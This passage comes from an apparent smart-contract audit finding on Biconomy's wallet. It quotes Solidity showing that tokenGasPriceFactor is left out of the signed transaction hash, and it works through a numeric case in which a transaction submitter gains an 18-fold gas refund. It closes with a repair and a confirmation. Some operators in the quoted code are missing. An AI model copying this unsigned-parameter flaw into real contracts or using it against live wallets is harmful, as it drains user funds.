tokenGasPriceFactor is not included:\n\nsol\n    function encodeTransactionData(\n        Transaction memory _tx,\n        FeeRefund memory refundInfo,\n        uint256 _nonce\n    ) public view returns (bytes memory) {\n        bytes32 safeTxHash =\n            keccak256(\n                abi.encode(\n                    ACCOUNT_TX_TYPEHASH,\n                    _tx.to,\n                    _tx.value,\n                    keccak256(_tx.data),\n                    _tx.operation,\n                    _tx.targetTxGas,\n                    refundInfo.baseGas,\n                    refundInfo.gasPrice,\n                    refundInfo.gasToken,\n                    refundInfo.refundReceiver,\n                    _nonce\n                )\n            );\n        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);\n    }\n\n\nThe value is used to determine the gas repayment in handlePayment() and handlePaymentRevert():\n\nsol\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n\n\nThat's called at the end of execTransaction():\n\nsol\n            if (refundInfo.gasPrice  0) {\n                //console.log(\"sent %s\", startGas gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n\n\nAs an example, given that:\n\n*   gasUsed = 1,000,000\n*   baseGas = 100,000\n*   gasPrice = 10,000,000,000 (10 gwei)\n*   tokenGasPriceFactor = 18\n\nYou get $(1,000,000 + 100,000) * 10,000,000,000 / 18 = 6.1111111e14$. If the submitter executes the transaction with tokenGasPriceFactor = 1 they get $1.1e16$ instead, i.e. 18 times more.\n\n",
                "Repair": "\ntokenGasPriceFactor should be included in the encoded transaction data and thus verified by the user's signature.\n\nlivingrockrises (Biconomy) confirmed(https://github.com/code-423n4/2023-01-biconomy-findings/issues/123#issuecomment-1403248885)\n\n\n\n*\n\n\n"
            }
        ]
    }
]